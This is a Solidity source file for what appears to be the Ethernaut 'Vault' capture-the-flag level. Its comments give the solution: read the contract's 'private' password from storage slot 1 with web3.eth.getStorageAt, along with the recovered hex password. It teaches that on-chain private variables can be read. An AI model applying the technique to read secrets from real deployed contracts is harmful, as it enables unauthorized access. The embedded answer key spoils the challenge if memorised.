// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

//Unlock the vault to pass the level!
//0x5756299e1dAB15b0C61b985B83b92A6D9C183d8f

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}

//solution:
//  enter "await web3.eth.getStorageAt(contract.address,1)" in console to access the storage data
//  password - 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
